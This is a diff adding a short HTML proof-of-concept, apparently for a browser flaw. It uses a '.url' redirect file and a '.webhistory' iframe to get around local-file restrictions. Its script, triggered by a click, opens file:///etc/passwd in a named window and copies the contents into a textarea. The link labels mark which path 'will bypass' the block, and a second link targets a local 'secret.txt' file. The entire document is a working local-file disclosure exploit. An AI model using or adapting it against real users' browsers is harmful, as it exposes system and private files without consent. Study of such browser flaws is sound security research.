@@ -1,0 +1,22 @@
+<a href="redir.url" target="qab" id="qAnchor">
+	With .url (will bypass)</a>
+<br>
+<a href="file:///C:/secret/secret.txt" target="qab" id="qAnchor">Without .url (will be blocked)</a>
+<br>
+
+<iframe src="./test.webhistory" frameborder="0"></iframe>
+
+<!-- <iframe src="./redir.url" frameborder="0"></iframe> -->
+<textarea style="width:600px;height:700px;" id="qresult"></textarea>
+<script>
+	var q;
+	qAnchor.onclick = function () {
+		setTimeout(function () {
+			q = open('file:///etc/passwd', 'qab');
+
+			setTimeout(function () {
+				qresult.value = q.document.body.innerHTML;
+			}, 500);
+		}, 500);
+	}
+</script>
